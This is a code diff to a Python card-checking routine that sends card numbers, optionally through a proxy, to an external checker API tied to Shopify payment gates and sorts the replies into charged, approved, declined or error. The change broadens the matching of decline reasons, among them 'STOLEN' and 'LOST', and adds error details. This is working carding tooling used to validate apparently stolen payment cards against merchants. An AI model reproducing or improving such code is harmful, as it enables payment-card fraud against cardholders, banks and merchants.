@@ -213,32 +213,39 @@ async def zanpakuto_check(card: str, proxy: str = "") -> dict:
             async with session.get(CHECKER_API, params=params) as resp:
                 data = await resp.json(content_type=None)
 
-        response  = data.get('Response', '')
+        response  = str(data.get('Response', '')).upper()
         status    = data.get('Status', '')
         gate      = data.get('Gate', 'Shopify')
         price     = data.get('Price', '?')
         site      = data.get('Site', '-')
         elapsed   = data.get('Time', '-')
         receipt   = data.get('Receipt', '')
+        error_detail = data.get('ErrorDetail', '') or data.get('Status', '') or response
         charged   = str(data.get('Charged', 'False')).lower() == 'true'
         approved  = str(data.get('Approved', 'False')).lower() == 'true'
 
-        if response == 'CHARGED' or charged:
+        # Flexible matching — catch all API response variations
+        if charged or 'CHARGED' in response:
             return {'status': 'CHARGED', 'gate': gate, 'price': price,
                     'site': site, 'time': elapsed, 'receipt': receipt,
-                    'raw': response, 'code': status}
+                    'raw': response, 'code': status or response}
 
-        if response == 'APPROVED' or (approved and not charged):
+        if approved or 'APPROVED' in response:
             return {'status': 'APPROVED', 'gate': gate, 'price': price,
-                    'site': site, 'time': elapsed, 'raw': response, 'code': status}
+                    'site': site, 'time': elapsed, 'raw': response,
+                    'code': status or response}
 
-        if response == 'CARD DECLINED':
+        if any(x in response for x in ('DECLINE', 'DECLINED', 'CARD DECLINED', 'DO NOT HONOR',
+                                        'INSUFFICIENT', 'INVALID', 'STOLEN', 'LOST',
+                                        'EXPIRED', 'PICKUP', 'BLOCKED', 'RESTRICTED')):
             return {'status': 'DECLINED', 'gate': gate, 'price': price,
-                    'site': site, 'time': elapsed, 'raw': response, 'code': status}
+                    'site': site, 'time': elapsed, 'raw': response,
+                    'code': status or error_detail or response}
 
+        # Still an error — but show full details for debugging
         return {'status': 'ERROR', 'gate': gate, 'price': '?',
                 'site': site, 'time': elapsed, 'raw': response,
-                'code': data.get('ErrorDetail', response)}
+                'code': error_detail or response or 'Unknown error from API'}
 
     except asyncio.TimeoutError:
         return {'status': 'TIMEOUT', 'raw': 'Zanpakuto timed out', 'gate': '-',
